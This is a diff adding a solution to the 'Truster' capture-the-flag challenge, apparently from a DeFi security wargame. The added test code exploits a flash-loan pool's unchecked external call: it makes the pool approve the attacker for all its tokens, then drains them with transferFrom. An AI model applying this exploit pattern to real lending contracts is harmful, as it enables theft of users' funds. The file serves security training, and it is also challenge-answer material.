@@ -29,6 +29,25 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const borrowAmount = 0;
+        const borrower = attacker.address;
+        const target = this.token.address;
+        const calldata = this.token.interface.encodeFunctionData(
+            "approve", [attacker.address, TOKENS_IN_POOL]
+        );
+        const flashLoanTx = await this.pool.connect(attacker).flashLoan(
+            borrowAmount, 
+            borrower, 
+            target, 
+            calldata
+        );
+        await flashLoanTx.wait();
+        const tokenTransferTx = await this.token.connect(attacker).transferFrom(
+            this.pool.address, 
+            attacker.address, 
+            TOKENS_IN_POOL
+        );
+        await tokenTransferTx.wait();
     });
 
     after(async function () {
